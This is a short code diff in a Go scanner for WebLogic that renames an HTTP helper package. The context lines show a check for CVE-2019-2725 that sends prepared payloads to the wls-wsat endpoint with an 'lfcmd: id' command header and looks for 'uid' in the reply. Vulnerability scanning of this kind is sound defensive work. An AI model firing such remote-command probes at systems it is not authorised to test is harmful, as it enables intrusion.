@@ -1,7 +1,7 @@
 package weblogic
 
 import (
-	"github.com/yhy0/Jie/pkg/protocols/http"
+	"github.com/yhy0/Jie/pkg/protocols/httpx"
 	"strings"
 )
 
@@ -68,8 +68,8 @@ func CVE_2019_2725(url string) bool {
 	header["Content-Type"] = "text/xml"
 	header["lfcmd"] = "id"
 	header["SOAPAction"] = ""
-	if req, err := http.Request(url+"/wls-wsat/CoordinatorPortType", "POST", weblogic_10_3_6post_str, false, header); err == nil {
-		if req2, err2 := http.Request(url+"/wls-wsat/CoordinatorPortType", "POST", weblogic_12_1_3post_str, false, header); err2 == nil {
+	if req, err := httpx.Request(url+"/wls-wsat/CoordinatorPortType", "POST", weblogic_10_3_6post_str, false, header); err == nil {
+		if req2, err2 := httpx.Request(url+"/wls-wsat/CoordinatorPortType", "POST", weblogic_12_1_3post_str, false, header); err2 == nil {
 			if (req.StatusCode == 200 && strings.Contains(req.Body, "uid")) || (req2.StatusCode == 200 && strings.Contains(req2.Body, "uid")) {
 				return true
 			}
